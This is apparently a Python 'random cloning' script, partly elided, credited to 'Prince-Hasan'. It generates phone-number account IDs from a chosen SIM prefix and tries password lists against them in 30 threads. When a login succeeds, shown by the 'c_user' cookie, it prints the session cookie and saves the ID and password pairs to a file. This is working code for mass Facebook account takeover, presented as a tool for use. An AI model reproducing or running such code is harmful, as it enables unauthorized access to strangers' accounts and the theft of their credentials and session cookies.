...
██   ██ ██   ██ ███████ ██   ██ ██   ████   
\x1b[38;5;50m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\x1b[38;5;46m𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝙳  = 𝙿𝚛𝚒𝚗𝚌𝚎-𝙷𝚊𝚜𝚊𝚗
\x1b[38;5;47m𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   = 𝙿𝚛𝚒𝚗𝚌𝚎-𝙷𝚊𝚜𝚊𝚗
\x1b[38;5;48m𝚃𝙾𝙾𝙻       = 𝚁𝙰𝙽𝙳𝙾𝙼
\x1b[38;5;49m𝚅𝙴𝚁𝚂𝙸𝙾𝙽    = 0-1
\x1b[38;5;50m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
def Main():
	os.system('clear')
	print(logo)
	print("\x1b[38;5;46m[01] 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝙻𝙾𝙽𝙸𝙽𝙶")
	print("\x1b[38;5;47m[02] 𝙵𝙻𝙾𝚆 𝙼𝚈 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺")
	print("\x1b[38;5;48m[00] 𝙴𝚇𝙸𝚃")
	print('\x1b[38;5;50m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	opt = input('\x1b[38;5;49m[✓] CHOOSE :  ')
	if opt in ["1","01"]:
		RAND()
	if opt in ["2","02"]:
		os.system('xdg-open https://www.facebook.com/profile.php?id=100041531163933');time.sleep(1)
	if opt in ["0","00"]:
		exit()
	else:
		print('\n\033[1;91mChoose valid option\033[0;97m');time.sleep(1)
		Main()
...
def RAND():
	...
	os.system('clear')
	print(logo)
	print("\x1b[38;5;46mSIM CODE 017-015-018-019-013-015-016")
	kode = input('\x1b[38;5;47m CHOOSE : ')
	print('\x1b[38;5;48m EXAMPLE : 1000,5000,10000,15000,20000] ')
	limit = int(input('\x1b[38;5;49m LIMIT : '))
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print('\x1b[38;5;50m𝚃𝙾𝚃𝙰𝙻 𝙸𝙳   :\x1b[38;5;46m  '+tl)
		print(f'\x1b[38;5;50m𝚂𝙸𝙼 𝙲𝙾𝙳𝙴   : \x1b[38;5;46m {kode} ')
		print('\x1b[38;5;50m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
		for guru in user:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r\033[1;90m[\033[1;92m𝙿𝚛𝚒𝚗𝚌𝚎-𝙷𝚊𝚜𝚊𝚗\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[𝙿𝚛𝚒𝚗𝚌𝚎-𝙾𝙺] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m[𝙲𝙾𝙾𝙺𝙸𝙴] : '+coki)
                print(f'\033[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                cek_apk(session,coki)
                print(f'\033[1;94m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
                oks.append(cid)
                open('/sdcard/rabby𝙿𝚛𝚒𝚗𝚌𝚎-ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
